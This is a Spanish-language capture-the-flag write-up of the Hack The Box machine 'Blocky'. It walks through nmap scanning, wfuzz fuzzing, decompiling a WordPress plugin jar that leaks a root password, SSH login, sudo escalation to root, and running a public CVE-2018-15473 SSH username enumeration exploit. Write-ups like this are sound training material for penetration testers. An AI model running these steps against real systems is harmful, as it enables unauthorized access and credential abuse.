---
layout: single
title: Blocky - Hack The Box
excerpt: "Esta es una máquina bastante sencilla, en donde haremos un Fuzzing y gracias a este descubriremos archivos de Java, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como Root. Además de que aprendemos a enumerar los usuarios del servicio SSH, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit CVE-2018-15473."
date: 2023-02-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-blocky/blocky_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Virtual Hosting
  - Fuzzing
  - Information Leakage
  - Java Decompiler 
  - SUDO Exploitation
  - SSH Username Enumeration
  - CVE-2018-15473
  - OSCP Style
---
![](/assets/images/htb-writeup-blocky/blocky_logo.png)
Esta es una máquina bastante sencilla, en donde haremos un **Fuzzing** y gracias a este descubriremos archivos de **Java**, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como **Root**. Además de que aprendemos a enumerar los usuarios del servicio **SSH**, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit **CVE-2018-15473**.

# Recopilación de Información
## Traza ICMP
Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO ocupa dicha máquina.
```
ping -c 4 10.10.10.37                           
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=134 ms
64 bytes from 10.10.10.37: icmp_seq=2 ttl=63 time=135 ms
64 bytes from 10.10.10.37: icmp_seq=3 ttl=63 time=133 ms
64 bytes from 10.10.10.37: icmp_seq=4 ttl=63 time=133 ms

--- 10.10.10.37 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 132.548/133.548/134.989/0.910 ms
```
Ok, el TTL nos dice que es una máquina con Linux, hagamos los escaneos.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:50 CST
Initiating SYN Stealth Scan at 14:50
Scanning 10.10.10.37 [65535 ports]
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 25565/tcp on 10.10.10.37
Increasing send delay for 10.10.10.37 from 0 to 5 due to 11 out of 23 dropped probes since last increase.
Completed SYN Stealth Scan at 14:50, 42.20s elapsed (65535 total ports)
Nmap scan report for 10.10.10.37
Host is up, received user-set (0.40s latency).
Scanned at 2023-02-20 14:50:15 CST for 43s
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.27 seconds
           Raw packets sent: 196623 (8.651MB) | Rcvd: 62 (2.724KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Hay 4 puertos abiertos, 3 de ellos ya los conocemos, el FTP, el SSH y el HTTP, pero...Minecraft? que curioso, veamos que nos dice el escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p21,22,80,25565 10.10.10.37 -oN targeted                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:58 CST
Nmap scan report for 10.10.10.37
Host is up (0.13s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Analizando lo que nos dio el escaneo, el FTP no tiene activo el login **Anonymous** por lo que no sirve tratar de entrar por ahí, no tenemos credenciales del SSH, entonces tendremos que irnos por la página web del puerto HTTP.

# Análisis de Vulnerabilidades
## Analisando Puerto HTTP
Veamos que nos dice la página:

![](/assets/images/htb-writeup-blocky/Captura1.png)

Ok, creo que ya sabemos que debemos hacer y que está pasando aquí. Estamos frente a un **Virtual Hosting** pues quiero pensar que cuando metemos la IP de la página, esta nos redirige hacia el puerto 25565, vamos a solucionar esto.

Vamos a registrar el nombre del dominio como viene ahí, como **blocky.htb** en el fichero **hosts** del directorio **/etc**:
```
nano /etc/hosts 
10.10.10.37 blocky.htb
```
Bien, recarguemos la página a ver si ya funciona:

![](/assets/images/htb-writeup-blocky/Captura2.png)

Excelente, ya funciona. Que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura3.png">
</p>

Ok, la página esta hecha con **Wordpress**, **PHP** y ahí viene el servidor **Apache**. Veamos que podemos hacer dentro de la página web.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura4.png">
</p>

Ahí vemos un login y si damos click en **Comments** y **Entries**, nos descargara 2 archivos **XML**:
```
file JZsE-b6w                    
JZsE-b6w: XML 1.0 document, ASCII text
file OTX7NxW5 
OTX7NxW5: XML 1.0 document, Unicode text, UTF-8 text, with very long lines (302)
```
Los analice un poco rápido, pero no vi nada que nos pueda ayudar de momento, sigamos buscando.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura5.png">
</p>

Vemos un post y podemos verlo mejor si damos click, entremos.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura6.png">
</p>

Una vez dentro, podemos comentar también, pero lo importante es que arriba del post aparece un usuario llamado **notch**, supongo que ese debe estar registrado en la página. Vamos al login.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura7.png">
</p>

Va, una vez aquí intentemos ver si existe el usuario notch:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura8.png">
</p>

¡Si existe! Puede que ese usuario este registrado en el **SSH**, solo nos falta la contraseña. Ahora hagamos un Fuzzing para saber que otras subpáginas hay.

## Fuzzing
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://blocky.htb/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://blocky.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   200        313 L    3592 W     52224 Ch    "# directory-list-2.3-medium.txt"                                           
000000003:   200        313 L    3592 W     52224 Ch    "# Copyright 2007 James Fisher"                                             
000000007:   200        313 L    3592 W     52224 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000241:   200        0 L      0 W        0 Ch        "wp-content"                                                                
000000014:   301        0 L      0 W        0 Ch        "http://blocky.htb//"                                                       
000000519:   200        37 L     61 W       745 Ch      "plugins"                                                                   
000000010:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000012:   200        313 L    3592 W     52224 Ch    "# on atleast 2 different hosts"                                            
000000006:   200        313 L    3592 W     52224 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"             
000000008:   200        313 L    3592 W     52224 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                
000000013:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000009:   200        313 L    3592 W     52224 Ch    "# Suite 300, San Francisco, California, 94105, USA."                       
000000004:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000005:   200        313 L    3592 W     52224 Ch    "# This work is licensed under the Creative Commons"                        
000000002:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000011:   200        313 L    3592 W     52224 Ch    "# Priority ordered case sensative list, where entries were found"          
000000786:   200        200 L    2015 W     40838 Ch    "wp-includes"                                                               
000001073:   403        11 L     32 W       296 Ch      "javascript"                                                                
000000083:   403        11 L     32 W       291 Ch      "icons"                                                                     
000007180:   302        0 L      0 W        0 Ch        "wp-admin"                                                                  
000000190:   200        10 L     51 W       380 Ch      "wiki"                                                                      
000010825:   200        25 L     347 W      10304 Ch    "phpmyadmin"                                                                
000045240:   301        0 L      0 W        0 Ch        "http://blocky.htb//"                                                       
000095524:   403        11 L     32 W       299 Ch      "server-status"                                                             

Total time: 510.1105
Processed Requests: 220560
Filtered Requests: 220536
Requests/sec.: 432.3768
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Hay varios que podemos ver, el que me llama la atención es el **wp-includes**, veamos que hay ahí.

![](/assets/images/htb-writeup-blocky/Captura9.png)

Son varios archivos y la página es muy lenta cuando intentamos abrir algún archivo y cuando lo abrimos no hay nada, es decir, que no podemos ver el contenido de los archivos, pero si ver que existen.

Bueno veamos que hay en plugins.

![](/assets/images/htb-writeup-blocky/Captura10.png)

A kbron, si les damos click a esos archivos se pueden descargar, pero... ¿qué es la extensión **.jar**?:

**Un archivo JAR es un tipo de archivo que permite ejecutar aplicaciones y herramientas escritas en el lenguaje Java. Las siglas están deliberadamente escogidas para que coincidan con la palabra inglesa "jar". Los archivos JAR están comprimidos con el formato ZIP y cambiada su extensión a .jar.**

Ahhhh entonces son archivos comprimidos de java, tratemos de ver su interior. 

Para esto es necesario descompilarlo porque no podremos abrir uno de estos archivos a menos que tengamos java para poder abrirlo y verlo y posiblemente este contenga una contraseña, entonces busquemos una herramienta para descompilar estos archivos.

Encontre una:
* http://java-decompiler.github.io/

Bien, instalémosla en nuestro equipo:
```
apt install jd-gui
```
Una vez instalada solo ponemos **jd-gui** para abrirla, así igual abrimos el **BurpSuite** solo poniendo el nombre en un terminal y yasta.

![](/assets/images/htb-writeup-blocky/Captura11.png)

Bien, como nos indica ahí, vamos a cargar los archivos, primero veamos el **BlockyCore.jar**:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura12.png">
</p>

Si no mal recuerdo de mis autoclases de Java, el cuadro amarillo debe ser una clase, veamos que contenido tiene:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura13.png">
</p>

En efecto, es una clase, veamos el contenido:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura14.png">
</p>

¿Es neta? jajaja que kgado, ya tenemos un usuario y la contraseña del Root, quiza **notch** es el Root o no sé, hay que probarlos.

# Explotación de Vulnerabilidades
Intentemos loguearnos con el usuario **notch**:
```
ssh notch@10.10.10.37       
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ whoami
notch
```
Vale somos **notch**, veamos que hay por aquí:
```
notch@Blocky:~$ ls -la
total 40
drwxr-xr-x 5 notch notch 4096 Jul  8  2022 .
drwxr-xr-x 3 root  root  4096 Jul  2  2017 ..
-rw------- 1 notch notch    1 Dec 24  2017 .bash_history
-rw-r--r-- 1 notch notch  220 Jul  2  2017 .bash_logout
-rw-r--r-- 1 notch notch 3771 Jul  2  2017 .bashrc
drwx------ 2 notch notch 4096 Jul  2  2017 .cache
drwxrwxr-x 7 notch notch 4096 Jul  2  2017 minecraft
drwxrwxr-x 2 notch notch 4096 Jul  2  2017 .nano
-rw-r--r-- 1 notch notch  655 Jul  2  2017 .profile
-r-------- 1 notch notch   33 Apr  4 15:48 user.txt
notch@Blocky:~$ cat user.txt
```
Excelente, ya tenemos la flag del usuario, ahora falta convertirnos en Root.

# Post Explotación
Lo primero como siempre, vamos a ver que privilegios tenemos:
```
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
Estamos en el grupo **SUDO**, vaya y si recordamos en el archivo **BlockyCore.jar**, la contraseña que usamos es la de Root, eso quiere decir que, si la volvemos a usar, seremos Root ¿no? Probemoslo:
```
notch@Blocky:~$ sudo su
[sudo] password for notch: 
root@Blocky:/home/notch# whoami
root
```
Changos, no pues si estuvo muy fácil, busquemos la flag del Root para terminal la máquina:
```
root@Blocky:/home/notch# cd /root
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt
```
¡Listo! Que cosa más fácil.

## Forma de Enumerar Usuarios de SSH
Esta vez tuvimos suerte al intuir que existía un usuario, pero ¿cómo sabremos si existe un usuario en un servicio SSH en el futuro? Por ejemplo, en **Windows** podemos usar **Crackmapexec** para el servicio **Samba**, pero aquí eso no sirve así que hay que buscar una manera.

Después de investigar un rato, gracias a **HackTricks** se puede enumerar los usuarios de un servicio **SSH** usando **Metasploit**, así que existe un Exploit que nos permita esto:

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh

Investigando un Exploit, encontré este:

* https://www.exploit-db.com/exploits/45233

Este nos sirve para la versión de SSH que esta usando la máquina, pues es **OpenSSH 7.2**. Busquémoslo con **Searchsploit**:

```
searchsploit OpenSSH 7.2           
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                             | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                            | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                    | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                       | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation       | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                   | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                       | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                      | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Incluso hay varias versiones, pero probemos el **Username Enumeration (2)** porque el que encontramos en internet no funciona.

### Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)
```
searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - Username Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
```
Bien, analizándolo un poco, veo mucho que ocupa la librería **Paramiko**, vamos a instalarla:
```
pip install paramiko      
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality
...
```
Listo, ahora probemos si nos da indicaciones sobre cómo usarlo, usaremos Python 2 porque con los otros no quiso correr:
```
python2 SSH_Exploit.py
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
usage: SSH_Exploit.py [-h] [-p PORT] target username

SSH User Enumeration by Leap Security (@LeapSecurity)

positional arguments:
  target                IP address of the target system
  username              Username to check for validity.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port of SSH service
```
Ok, entonces hay que indicarle la IP de la máquina y el usuario, nos pide el puerto también, pero es opcional así que no lo pondré. Usemos el Exploit:
```
python2 SSH_Exploit.py 10.10.10.37 notch   
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] notch is a valid username
```
PERFECTO! Ahí nos dice que **notch** si existe en esa máquina, pero no me gusta ese error que nos manda, quitémoslo para que solo se vea el resultado:
```
python2 SSH_Exploit.py 10.10.10.37 notch 2>/dev/null
[+] notch is a valid username
```
OK, ya nada más se ve el resultado.

Esta es una forma de saber si existe un usuario en un servicio SSH, para el futuro puede que nos sirva este Exploit.

## Links de Investigación
* http://java-decompiler.github.io/
* https://stackoverflow.com/questions/41305479/how-to-check-if-username-is-valid-on-a-ssh-server
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
* https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/
* https://www.exploit-db.com/exploits/45233

# FIN
